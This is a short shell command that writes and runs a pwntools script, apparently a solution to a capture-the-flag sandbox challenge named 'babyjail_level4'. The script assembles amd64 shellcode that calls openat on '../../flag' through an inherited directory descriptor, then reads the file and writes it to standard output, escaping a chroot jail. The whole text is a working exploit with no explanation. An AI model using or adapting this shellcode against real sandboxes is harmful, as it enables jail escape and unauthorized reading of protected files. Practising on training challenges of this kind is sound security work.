echo 'import pwn
pwn.context.arch = "amd64"

# Create shellcode to open the file
openat_shellcode = pwn.shellcraft.amd64.openat(3,"../../flag").rstrip()

read_shellcode = pwn.shellcraft.amd64.read("rax", "rsp", 1024).rstrip()
write_shellcode = pwn.shellcraft.amd64.write(1, "rsp", 1024).rstrip()

# Assemble the combined shellcode
print(openat_shellcode+read_shellcode+write_shellcode)
assembly = pwn.asm(openat_shellcode+read_shellcode+write_shellcode)

with open("raw3", "wb") as f:
    f.write(assembly)' > sand.py && /bin/python3 sand.py && /challenge/babyjail_level4 . < raw3
